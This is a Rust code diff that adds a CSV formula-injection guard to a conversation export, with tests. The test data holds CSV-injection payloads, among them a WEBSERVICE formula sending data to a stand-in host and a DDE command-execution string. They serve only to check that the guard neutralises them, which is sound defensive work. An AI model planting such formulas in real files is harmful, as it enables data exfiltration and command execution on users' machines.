@@ -376,6 +376,29 @@ fn try_export_json(conn: &Connection, backups_dir: &Path) -> Result<Value> {
     }))
 }
 
+/// Clean-audit item 106: the CSV export lacked a formula-injection guard.
+/// A cell that starts with a formula trigger (`=`, `+`, `-`, `@`, TAB,
+/// CR — the OWASP CSV-injection set) executes when the exported file is
+/// opened in a spreadsheet: a conversation subject like
+/// `=HYPERLINK("http://evil","click")` became a live formula on the
+/// analyst's desk. The guard prefixes those cells with a single quote,
+/// which spreadsheet apps render as inert text, then applies the normal
+/// CSV quoting on top.
+fn csv_cell(v: &Option<String>) -> String {
+    let raw = v.as_deref().unwrap_or("");
+    let guarded = if raw.starts_with(['=', '+', '-', '@', '\t', '\r']) {
+        format!("'{raw}")
+    } else {
+        raw.to_string()
+    };
+    let s = guarded.replace('"', "\"\"");
+    if s.contains('"') || s.contains(',') || s.contains('\n') {
+        format!("\"{s}\"")
+    } else {
+        s
+    }
+}
+
 pub fn export_conversations_csv(conn: &Connection, backups_dir: &Path) -> Value {
     try_export_csv(conn, backups_dir)
         .unwrap_or_else(|e| json!({ "ok": false, "message": format!("Export failed: {e}") }))
@@ -435,14 +458,7 @@ fn try_export_csv(conn: &Connection, backups_dir: &Path) -> Result<Value> {
             r.get::<_, Option<String>>(7)?,
         ))
     })?;
-    let esc = |v: &Option<String>| -> String {
-        let s = v.as_deref().unwrap_or("").replace('"', "\"\"");
-        if s.contains('"') || s.contains(',') || s.contains('\n') {
-            format!("\"{s}\"")
-        } else {
-            s
-        }
-    };
+    let esc = |v: &Option<String>| -> String { csv_cell(v) };
     let mut lines = vec![header.join(",")];
     for row in rows.flatten() {
         let values = [
@@ -706,6 +722,87 @@ mod tests {
         assert!(!dir.join("supportos-backup-0.settings.json").exists());
         assert!(!dir.join("supportos-backup-1.settings.json").exists());
 
+        let _ = fs::remove_dir_all(&dir);
+    }
+}
+
+#[cfg(test)]
+mod batch29_audit106_tests {
+    use super::*;
+
+    fn csv_temp_dir(tag: &str) -> PathBuf {
+        let dir = std::env::temp_dir().join(format!(
+            "spp-csv-guard-{tag}-{}-{}",
+            std::process::id(),
+            chrono::Utc::now().timestamp_millis()
+        ));
+        let _ = fs::remove_dir_all(&dir);
+        fs::create_dir_all(&dir).expect("temp dir");
+        dir
+    }
+
+    /// Clean-audit item 106: the CSV export must carry the formula-injection
+    /// guard — a conversation subject that starts with a formula trigger
+    /// (= + - @ TAB CR) is prefixed with a single quote so a spreadsheet
+    /// renders inert text, while ordinary cells pass through unchanged.
+    #[test]
+    fn audit106_csv_export_neutralizes_formula_cells() {
+        let dir = csv_temp_dir("csv-guard");
+        let mut conn = Connection::open_in_memory().expect("db");
+        crate::bootstrap::apply_all(&mut conn).expect("migrations");
+        for (remote, number, subject) in [
+            (
+                9501i64,
+                95i64,
+                "=HYPERLINK(\"http://evil.example\",\"click me\")",
+            ),
+            (9502, 96, "+SUM(A1:A9)"),
+            (9503, 97, "@WEBSERVICE(\"http://evil.example/collect?p=\")"),
+            (9504, 98, "-2+cmd|'/c calc'!A0"),
+            (9505, 99, "Ordinary refund question"),
+        ] {
+            conn.execute(
+                "INSERT INTO conversations (remote_id, number, subject, status)
+                 VALUES (?1, ?2, ?3, 'active')",
+                rusqlite::params![remote, number, subject],
+            )
+            .expect("conversation");
+        }
+        let out = export_conversations_csv(&conn, &dir);
+        assert!(
+            out.get("ok")
+                .and_then(serde_json::Value::as_bool)
+                .unwrap_or(false),
+            "export failed: {out}"
+        );
+        let path = PathBuf::from(out.get("path").and_then(|v| v.as_str()).expect("path"));
+        let text = fs::read_to_string(&path).expect("csv text");
+        // CSV quoting doubles inner quotes inside a quoted field; the guard
+        // prefix must sit INSIDE the quoted cell.
+        assert!(
+            text.contains("\"'=HYPERLINK(\"\"http://evil.example\"\",\"\"click me\"\")\""),
+            "the = cell must be quote-prefixed: {text}"
+        );
+        assert!(
+            text.contains("'+SUM(A1:A9)"),
+            "the + cell must be quote-prefixed: {text}"
+        );
+        assert!(
+            text.contains("\"'@WEBSERVICE(\"\"http://evil.example/collect?p=\"\")\""),
+            "the @ cell must be quote-prefixed: {text}"
+        );
+        assert!(
+            text.contains("'-2+cmd|'/c calc'!A0"),
+            "the - cell must be quote-prefixed: {text}"
+        );
+        assert!(
+            text.contains(",Ordinary refund question,"),
+            "ordinary cells pass through unchanged: {text}"
+        );
+        assert!(
+            !text.contains("\n=HYPERLINK"),
+            "no raw formula may start a cell: {text}"
+        );
         let _ = fs::remove_dir_all(&dir);
     }
 }
